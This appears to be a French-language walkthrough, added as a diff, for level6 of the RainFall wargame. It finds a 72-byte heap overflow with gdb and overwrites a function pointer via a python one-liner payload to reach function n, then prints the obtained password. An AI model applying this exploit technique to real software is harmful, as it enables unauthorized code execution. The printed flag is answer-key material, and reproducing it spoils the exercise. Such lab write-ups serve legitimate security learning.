@@ -1,0 +1,57 @@
+Pour ce level le binaire prend un argument et nous renvois "Nope" si on lui met un ou plusieurs arguments.
+Cependant si on lui met 0 argument il segfault.
+
+Voir disas_analys pour le disas de toute les fonctions
+
+On regarde avec gdb les fonctions
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x080482f4  _init
+0x08048340  strcpy
+0x08048340  strcpy@plt
+0x08048350  malloc
+0x08048350  malloc@plt
+0x08048360  puts
+0x08048360  puts@plt
+0x08048370  system
+0x08048370  system@plt
+0x08048380  __gmon_start__
+0x08048380  __gmon_start__@plt
+0x08048390  __libc_start_main
+0x08048390  __libc_start_main@plt
+0x080483a0  _start
+0x080483d0  __do_global_dtors_aux
+0x08048430  frame_dummy
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+0x080484e0  __libc_csu_init
+0x08048550  __libc_csu_fini
+0x08048552  __i686.get_pc_thunk.bx
+0x08048560  __do_global_ctors_aux
+0x0804858c  _fini
+
+Dans le main on observe que strcpy va recuperer en param argv. Cependant argv a ete malloc avec une taille de 64 puisune seconde fois avec 4
+
+On supose donc on va partir de 68 pour pouvoir trouver a partir de quel zone memoire sa segfault
+
+apres quelque test on trouve 72. Donc si le param est = a une lengh de 72 elle segfault.
+
+On suppose donc que ce qui est entre 68 et 72 est un adresse a fournir. Ce qui commence a avoir du sens car on veut
+acceder a la fonction n.
+
+On fournis donc l'adresse de n
+
+level6@RainFall:~$ ./level6 $(python -c 'print "o" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+Ca fonctionne
+
+level6@RainFall:~$ su level7
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+
